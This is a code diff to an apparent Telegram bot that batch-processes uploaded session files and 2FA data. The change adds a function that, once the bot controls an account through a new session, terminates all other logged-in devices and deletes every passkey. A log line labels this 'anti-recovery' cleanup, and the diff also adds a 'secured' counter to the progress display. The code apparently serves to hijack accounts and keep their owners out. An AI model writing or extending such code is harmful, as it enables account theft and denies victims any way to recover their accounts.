@@ -11,6 +11,7 @@ import sqlite3
 from datetime import datetime
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError
+from telethon import functions
 import logging
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.constants import ParseMode
@@ -581,20 +582,24 @@ async def _process_recovery_internal(update, context, user_id, session_files, ex
                 shutil.copy2(session_path, os.path.join(target_dir, session_basename))
             if json_path and os.path.exists(json_path):
                 shutil.copy2(json_path, os.path.join(target_dir, os.path.basename(json_path)))
-        return {"category": "success" if result["status"] == "success" else "fail", "name": session_name}
+        return {"category": "success" if result["status"] == "success" else "fail", "name": session_name, "secured": result["status"] == "success"}
 
     task = BatchTask(user_id, update.effective_chat.id, session_files, "recovery")
     watchdog = arm_timeout(task, MAX_TASK_TIME)
 
     async def on_progress(t):
         c = {"success": 0, "fail": 0}
+        secured = 0
         for r in t.done:
             if r.get("category") in c:
                 c[r["category"]] += 1
+            if r.get("secured"):
+                secured += 1
             t._progress_text = f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>{tr('recovery.in_progress', lang)}</b>
 
 {tr('shaihuo.progress', lang)}: {t.completed}/{len(session_files)}
 {tr('shaihuo.success', lang)}: {c['success']} | {tr('2fa.failed', lang)}: {c['fail']}
+<tg-emoji emoji-id="5846008814129649022">🛡️</tg-emoji> {tr('recovery.secured', lang)}: {secured}
 <tg-emoji emoji-id="5775887550262546277">⏳</tg-emoji> {tr('recovery.processing', lang)}..."""
 
     await run_batch(update, context, task, process_one, on_progress=on_progress)
@@ -713,6 +718,33 @@ async def generate_json_for_session(session_file, client, me, api_id, api_hash, 
     except Exception as e:
         logger.error(f"生成 JSON 失败 {session_file}: {e}")
         return None
+
+async def secure_after_recovery(client):
+    res = {"kicked": 0, "del_pk": 0, "errs": []}
+    try:
+        auths = await client(functions.account.GetAuthorizationsRequest())
+        for a in getattr(auths, "authorizations", []):
+            if not getattr(a, "current", False):
+                try:
+                    await client(functions.account.ResetAuthorizationRequest(hash=getattr(a, "hash", 0)))
+                    res["kicked"] += 1
+                except Exception as e:
+                    res["errs"].append(f"reset:{e}")
+    except Exception as e:
+        res["errs"].append(f"get_auths:{e}")
+    try:
+        pks = await client(functions.account.GetPasskeysRequest())
+        for p in getattr(pks, "passkeys", []):
+            pid = getattr(p, "id", None)
+            if pid is not None:
+                try:
+                    await client(functions.account.DeletePasskeyRequest(passkey_id=pid))
+                    res["del_pk"] += 1
+                except Exception as e:
+                    res["errs"].append(f"del_pk:{e}")
+    except Exception as e:
+        res["errs"].append(f"get_pks:{e}")
+    return res
 
 async def process_single_account(session_path, json_path, two_fa, user_id, session_name):
     result = {
@@ -886,6 +918,8 @@ async def process_single_account(session_path, json_path, two_fa, user_id, sessi
                 return result
 
         await client_new.get_me()
+        secure = await secure_after_recovery(client_new)
+        log_time(f"防找回安全清理: 踢出其他设备 {secure['kicked']} 个, 销毁 Passkey {secure['del_pk']} 个, 错误 {secure['errs']}")
         await client_old.log_out()
 
         new_json_data = {
